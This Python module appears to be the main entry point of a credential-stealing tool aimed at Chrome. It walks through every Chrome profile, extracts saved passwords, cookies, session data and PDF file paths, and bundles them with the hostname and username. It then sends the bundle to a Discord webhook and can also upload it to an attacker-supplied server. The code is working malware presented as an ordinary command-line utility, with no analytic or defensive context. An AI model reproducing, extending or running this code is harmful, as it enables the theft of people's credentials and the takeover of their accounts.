import argparse
import asyncio
import sys
import os
import platform
from .extractor import get_chrome_profiles, extract_all
from .uploader import upload_all
from .discord_sender import save_data_to_file_and_send

async def main(server_url=None):
    profiles = get_chrome_profiles()
    if not profiles:
        # If no Chrome profiles are found, we can still proceed with other data extraction
        print("No Chrome profiles found. Proceeding with other data extraction...")
        # Create an upload pair with system info only
        system_data = {
            "system_info": {"hostname": platform.node(), "username": os.getenv('USER', 'unknown')}, 
            "passwords": [], 
            "cookies": [], 
            "sessions": {}
        }
        await save_data_to_file_and_send(system_data, [])
        return
    
    profiles_data = [extract_all(p) for p in profiles]
    
    # Process each profile's data
    for d in profiles_data:
        structured_data = {
            "system_info": {"hostname": platform.node(), "username": os.getenv('USER', 'unknown')},
            "passwords": d["passwords"],
            "cookies": d["cookies"],
            "sessions": d["sessions"],
            "pdf_paths": d["pdf_paths"]
        }
        
        # Send to Discord webhook
        await save_data_to_file_and_send(structured_data, d["pdf_paths"])
        
        # Also upload to server if URL provided
        if server_url:
            await upload_all(server_url, [(structured_data, d["pdf_paths"])])

def cli_main():
    parser = argparse.ArgumentParser(description="Extract Chrome data and upload to server or send to Discord")
    parser.add_argument("server_url", nargs='?', default=None, help="FastAPI server URL (optional, for backward compatibility)")
    args = parser.parse_args()
    asyncio.run(main(args.server_url))